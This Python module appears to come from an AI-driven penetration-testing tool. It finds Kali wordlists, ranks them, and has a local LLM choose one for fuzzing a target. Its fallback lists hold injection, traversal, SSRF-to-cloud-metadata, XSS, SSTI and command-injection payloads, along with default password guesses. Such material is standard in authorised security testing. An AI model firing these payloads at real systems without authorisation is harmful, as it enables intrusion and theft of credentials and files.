import hashlib
import json
import re
import threading
from pathlib import Path
from typing import Any, Optional

from .base import *
from .. import engine as _engine

console = getattr(_engine, "console", None)
HAS_OLLAMA = getattr(_engine, "HAS_OLLAMA", False)
MODEL_NAME = getattr(_engine, "MODEL_NAME", "")

class WordlistScanner:
    """
    Scans all available .txt wordlists on Kali Linux.
    Collects results into a category-based dictionary.
    This class runs only ONCE (singleton), then serves from cache.
    """

    # Primary directories where wordlists are stored (priority order)
    SEARCH_ROOTS = [
        Path("/usr/share/seclists"),
        Path("/usr/share/wordlists"),
        Path("/usr/share/wfuzz/wordlist"),
        Path("/usr/share/dirb/wordlists"),
        Path("/usr/share/dirbuster"),
        Path("/opt/seclists"),
        Path("/opt/wordlists"),
        Path.home() / "wordlists",
        Path.home() / "SecLists",
    ]

    # Keywords searched within filenames for each category
    # (priority order: first match is used)
    CATEGORY_KEYWORDS = {
        "lfi": [
            "lfi-jhaddix", "lfi-suite", "lfi_", "traversal",
            "path-traversal", "dotdot", "lfi",
        ],
        "sqli": [
            "sql-injection", "sqli", "sql_injection",
            "mysql", "mssql", "oracle", "postgres",
        ],
        "xss": [
            "xss", "cross-site", "html-injection",
        ],
        "ssti": [
            "ssti", "template-injection", "server-side-template",
        ],
        "ssrf": [
            "ssrf", "server-side-request",
        ],
        "cmdi": [
            "command-injection", "cmdi", "cmd-injection",
            "os-injection", "rce",
        ],
        "dirs": [
            "directory-list-2.3-medium",
            "directory-list-2.3-small",
            "common",
            "big",
            "directory-list",
        ],
        "params": [
            "burp-parameter-names",
            "parameter-names",
            "api-endpoints",
            "param",
        ],
        "passwords": [
            "rockyou",
            "top-100",
            "top-1000",
            "fasttrack",
            "common-credentials",
        ],
        "usernames": [
            "top-usernames",
            "usernames",
            "username",
        ],
        "api": [
            "api-endpoints",
            "api/",
            "graphql",
            "rest",
        ],
        "backup": [
            "backup",
            "sensitive-files",
            "config-files",
            "web-extensions",
        ],
    }

    _instance = None
    _catalog: dict[str, list[str]] = {}   # category → [path1, path2, ...]
    _scanned = False
    _lock = threading.Lock()

    @classmethod
    def get_catalog(cls) -> dict[str, list[str]]:
        """Scans system once, then returns from cache."""
        with cls._lock:
            if cls._scanned:
                return cls._catalog
            cls._catalog = cls._scan()
            cls._scanned = True
            total = sum(len(v) for v in cls._catalog.values())
            filled = {k: v for k, v in cls._catalog.items() if v}
            empty  = [k for k, v in cls._catalog.items() if not v]
            console.print(f"[dim]  WordlistScanner: {total} wordlist(s) — "
                          f"{len(filled)} categories found, "
                          f"{len(empty)} empty: {empty}[/dim]")
            if total == 0:
                console.print(
                    "[dim yellow]  ⚠ No system wordlists found. "
                    "Install: sudo apt install seclists  "
                    "Falling back to built-in minimal payloads.[/dim yellow]"
                )
        return cls._catalog

    @classmethod
    def _scan(cls) -> dict[str, list[str]]:
        catalog: dict[str, list[str]] = {cat: [] for cat in cls.CATEGORY_KEYWORDS}

        for root in cls.SEARCH_ROOTS:
            if not root.exists():
                continue
            for fpath in root.rglob("*.txt"):
                name_lower = fpath.name.lower()
                path_lower = str(fpath).lower()
                for cat, keywords in cls.CATEGORY_KEYWORDS.items():
                    if any(cls._keyword_match(name_lower, path_lower, kw) for kw in keywords):
                        catalog[cat].append(str(fpath))
                        break  # one file per category

        # Priority: smaller/medium files first (large files take time)
        for cat in catalog:
            catalog[cat].sort(key=lambda p: Path(p).stat().st_size
                              if Path(p).exists() else 0)

        return catalog

    @staticmethod
    def _keyword_match(name_lower: str, path_lower: str, keyword: str) -> bool:
        """Short keywords (e.g., lfi) should match as token, not inside random words (e.g., dolfin)."""
        kw = (keyword or "").lower()
        if not kw:
            return False
        if len(kw) <= 3:
            pat = rf"(^|[^a-z0-9]){re.escape(kw)}([^a-z0-9]|$)"
            return bool(re.search(pat, name_lower)) or bool(re.search(pat, path_lower))
        return kw in name_lower or kw in path_lower

    @classmethod
    def best(cls, category: str) -> Optional[str]:
        """Returns the best (smallest/most appropriate) wordlist for a category."""
        catalog = cls.get_catalog()
        candidates = catalog.get(category, [])
        for p in candidates:
            if Path(p).exists():
                return p
        return None

    @classmethod
    def summary(cls) -> dict[str, int]:
        """Shows how many wordlists exist per category."""
        return {cat: len(paths) for cat, paths in cls.get_catalog().items()}

class AIWordlistSelector:
    """
    AI selects the most appropriate wordlist based on site technology,
    parameter names, and URL structure from available system wordlists.

    How it works:
    1. WordlistScanner provides all available wordlist paths
    2. AI reviews them and selects the best one for the task
    3. If AI can't select or none exist — built-in fallback is used
    """

    def __init__(self, ai: Any):
        self.ai = ai
        self._cache: dict[str, str] = {}  # (category+context_hash) → path
        # Prefer practical, widely used wordlists first.
        self._preferred_names: dict[str, list[str]] = {
            "dirs": [
                "directory-list-2.3-medium",
                "directory-list-2.3-small",
                "raft-medium-directories",
                "raft-small-directories",
                "common.txt",
            ],
            "params": [
                "burp-parameter-names",
                "url-params_from-top-55-most-popular-apps",
                "all-params",
                "parameter-names",
            ],
            "lfi": [
                "lfi-gracefulsecurity-linux",
                "lfi-gracefulsecurity-windows",
                "lfi",
                "traversal",
                "path-traversal",
            ],
            "sqli": ["sqli", "sql-injection", "union", "fuzzdb"],
            "xss": ["xss", "cross-site", "payload"],
            "ssti": ["ssti", "template"],
            "ssrf": ["ssrf", "server-side-request"],
            "cmdi": ["command-injection", "cmdi", "rce"],
        }
        # Explicitly de-prioritize niche/overly noisy lists.
        self._avoid_names: dict[str, list[str]] = {
            "lfi": ["jhaddix"],
            "dirs": ["common_directories"],
        }
        # Hard blacklist: never select these lists.
        self._hard_block_names: dict[str, list[str]] = {
            "dirs": ["common_directories"],
            "lfi": ["dolfin", "jhaddix"],
        }

    def select(self, category: str, context: dict) -> str:
        """
        category: 'lfi' | 'sqli' | 'xss' | 'ssrf' | 'cmdi' | 'dirs' | 'params' | ...
        context: {
            'url': str,
            'param': str,
            'tech': str,          # 'php' | 'java' | 'python' | 'node' | ...
            'param_type': str,    # 'file' | 'id' | 'url' | 'cmd' | ...
            'page_title': str,
            'server': str,        # response header Server:
            'response_snippet': str,
        }

        Returns: available wordlist file path or fallback /tmp file path
        """
        # Cache check
        ctx_hash = hashlib.md5(
            (category + json.dumps(context, sort_keys=True, default=str)).encode()
        ).hexdigest()[:8]
        cache_key = f"{category}:{ctx_hash}"
        if cache_key in self._cache:
            cached = self._cache[cache_key]
            if Path(cached).exists() and not self._is_hard_blocked(category, cached):
                return cached

        # Get available system wordlists
        catalog = WordlistScanner.get_catalog()
        candidates = catalog.get(category, [])
        candidates = self._filter_candidates(category, candidates)

        if not candidates:
            # No wordlists for this category — fallback
            return self._make_fallback(category)

        # Deterministic ranking: popular/practical lists first.
        ranked = self._rank_candidates(category, candidates)
        if len(ranked) == 1:
            self._cache[cache_key] = ranked[0]
            return ranked[0]

        # If best candidate is clearly better, pick it directly.
        best_gap = self._score_candidate(category, ranked[0]) - self._score_candidate(category, ranked[1])
        if best_gap >= 4:
            self._cache[cache_key] = ranked[0]
            console.print(f"  [dim cyan]Heuristic wordlist: {Path(ranked[0]).name} ({category})[/dim cyan]")
            return ranked[0]

        # Otherwise AI can tie-break only among top ranked candidates.
        selected = self._ask_ai(category, ranked[:8], context)

        if selected and Path(selected).exists() and not self._is_hard_blocked(category, selected):
            self._cache[cache_key] = selected
            console.print(f"  [dim cyan]AI wordlist: {Path(selected).name} "
                          f"({category})[/dim cyan]")
            return selected

        # AI couldn't select — use first available file
        for p in ranked:
            if Path(p).exists() and not self._is_hard_blocked(category, p):
                self._cache[cache_key] = p
                return p

        return self._make_fallback(category)

    def _filter_candidates(self, category: str, candidates: list[str]) -> list[str]:
        blocked = [k.lower() for k in self._hard_block_names.get(category, [])]
        if not blocked:
            return candidates
        filtered = []
        for p in candidates:
            name = Path(p).name.lower()
            if any(b in name for b in blocked):
                continue
            filtered.append(p)
        return filtered

    def _is_hard_blocked(self, category: str, path: str) -> bool:
        blocked = [k.lower() for k in self._hard_block_names.get(category, [])]
        if not blocked:
            return False
        name = Path(path).name.lower()
        return any(b in name for b in blocked)

    def _ask_ai(self, category: str, candidates: list[str],
                context: dict) -> Optional[str]:
        """Give AI the candidate list and ask for the best match."""
        if not HAS_OLLAMA:
            return None

        # Shorten file names (AI doesn't need full paths)
        candidate_names = [
            {"index": i, "name": Path(p).name, "path": p,
             "size_kb": round(Path(p).stat().st_size / 1024) if Path(p).exists() else 0}
            for i, p in enumerate(candidates[:20])  # Max 20 shown
        ]

        prompt = f"""You are a penetration testing AI. Select the BEST wordlist for the task.

TASK: {category} fuzzing
TARGET URL: {context.get('url', 'unknown')}
PARAMETER: {context.get('param', 'unknown')}
DETECTED TECH: {context.get('tech', 'unknown')}
PARAM TYPE: {context.get('param_type', 'unknown')}
SERVER: {context.get('server', 'unknown')}
PAGE HINTS: {context.get('page_title', '')[:100]}

AVAILABLE WORDLISTS (from this Kali system):
{json.dumps(candidate_names, indent=2)}

Select the single BEST wordlist index for this specific test.
Consider: target tech (PHP needs PHP-specific LFI paths), param name hints, server type.

Respond ONLY with JSON: {{"selected_index": 0, "reason": "brief reason"}}
"""
        try:
            _client = create_ollama_client()
            if _client is None:
                return None
            resp = _client.chat(
                model=MODEL_NAME,
                messages=[{"role": "user", "content": prompt}],
            )
            raw = resp["message"]["content"]
            clean = re.sub(r'```json|```', '', raw).strip()
            result = None
            decoder = json.JSONDecoder()
            start = clean.find("{")
            if start != -1:
                try:
                    result, _end = decoder.raw_decode(clean[start:])
                except Exception:
                    result = None
            if isinstance(result, dict):
                idx = result.get("selected_index", 0)
                reason = result.get("reason", "")
                if 0 <= idx < len(candidates):
                    console.print(f"  [dim]AI chose wordlist[{idx}]: "
                                  f"{Path(candidates[idx]).name} — {reason[:60]}[/dim]")
                    return candidates[idx]
        except Exception as e:
            console.print(f"[dim red]AIWordlistSelector error: {e}[/dim red]")
        return None

    def _rank_candidates(self, category: str, candidates: list[str]) -> list[str]:
        return sorted(candidates, key=lambda p: self._score_candidate(category, p), reverse=True)

    def _score_candidate(self, category: str, path: str) -> int:
        name = Path(path).name.lower()
        path_lower = str(path).lower()
        score = 0

        preferred = [k.lower() for k in self._preferred_names.get(category, [])]
        avoid = [k.lower() for k in self._avoid_names.get(category, [])]

        # Strong boost for known good lists.
        for idx, key in enumerate(preferred):
            if key and key in name:
                score += max(12 - idx, 4)

        if category == "dirs":
            if "/discovery/web-content/" in path_lower.replace("\\", "/"):
                score += 4
            if "directory-list" in name:
                score += 4
            if "raft-" in name and "directories" in name:
                score += 3

        # Penalize noisy/less practical lists for this workflow.
        if any(key in name for key in avoid):
            score -= 8

        # Prefer medium/small for speed and signal quality.
        if "medium" in name:
            score += 3
        if "small" in name or "common" in name:
            score += 2
        if "huge" in name or "mega" in name or "big" in name:
            score -= 2

        # Gentle nudge by file size to avoid massive noisy files.
        try:
            kb = Path(path).stat().st_size / 1024.0
            if category == "dirs":
                # Tiny custom lists like 5-20 lines are poor defaults for discovery.
                if kb < 2:
                    score -= 10
                elif kb < 8:
                    score -= 4
                elif 32 <= kb <= 1024:
                    score += 3
            elif kb < 256:
                score += 1
            elif kb > 4096:
                score -= 2
        except Exception:
            pass

        return score

    _fallback_warned: set = set()   # class-level, warn only once

    def _make_fallback(self, category: str) -> str:
        """If no system wordlist found, writes built-in minimal list to /tmp."""
        BUILTIN_FALLBACKS = {
            "lfi": [
                "../../../../etc/passwd", "../../etc/passwd", "../etc/passwd",
                "/etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252F..%252Fetc%252Fpasswd",
                "../../../../etc/shadow", "../../../../etc/hosts",
                "../../../../windows/win.ini", "../../../../windows/system32/drivers/etc/hosts",
                "C:/Windows/win.ini", "C:\\Windows\\win.ini",
            ],
            "sqli": [
                "'", "''", "1'--", "1 OR 1=1--", "admin'--", "' OR '1'='1",
                "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--",
                "' UNION SELECT NULL--", "1 AND 1=1", "1 AND 1=2",
                "'; WAITFOR DELAY '0:0:3'--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "';alert(1)//",
                "{{7*7}}", "${7*7}", "#{7*7}",
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
                "{{config}}", "{{self.__dict__}}",
                "{% debug %}", "{php}echo 7*7;{/php}",
            ],
            "ssrf": [
                "http://127.0.0.1/", "http://localhost/",
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data",
                "http://localhost:8080/", "http://0.0.0.0/",
                "file:///etc/passwd", "file:///etc/hosts",
                "dict://127.0.0.1:6379/info",
                "gopher://127.0.0.1:9200/_cat/indices",
            ],
            "cmdi": [
                "; id", "| id", "` id`", "$(id)", "&& id",
                "; sleep 3", "| sleep 3", "$(sleep 3)",
                "; cat /etc/passwd", "| cat /etc/passwd",
                "|| id", "; whoami",
            ],
            "dirs": [
                "admin", "administrator", "login", "dashboard", "api",
                "backup", "config", ".env", "test", "debug", "uploads",
                "v1", "v2", "graphql", "swagger", "actuator",
                "phpmyadmin", "wp-admin", "console", "health",
            ],
            "params": [
                "id", "user", "name", "token", "key", "page", "limit",
                "file", "path", "url", "redirect", "next", "return",
                "debug", "admin", "role", "type", "action", "cmd",
            ],
            "passwords": [
                "admin", "password", "123456", "admin123", "pass",
                "test", "root", "qwerty", "letmein", "welcome",
            ],
        }
        items = BUILTIN_FALLBACKS.get(category, ["test"])
        path = Path(f"/tmp/pentest_ai_fallback_{category}.txt")
        path.write_text("\n".join(items))
        if category not in AIWordlistSelector._fallback_warned:
            AIWordlistSelector._fallback_warned.add(category)
            console.print(f"  [dim yellow]  ⚠ No system wordlist for '{category}' — "
                          f"using built-in fallback ({len(items)} payloads). "
                          f"Install: sudo apt install seclists[/dim yellow]")
        return str(path)

__all__ = ['WordlistScanner', 'AIWordlistSelector']
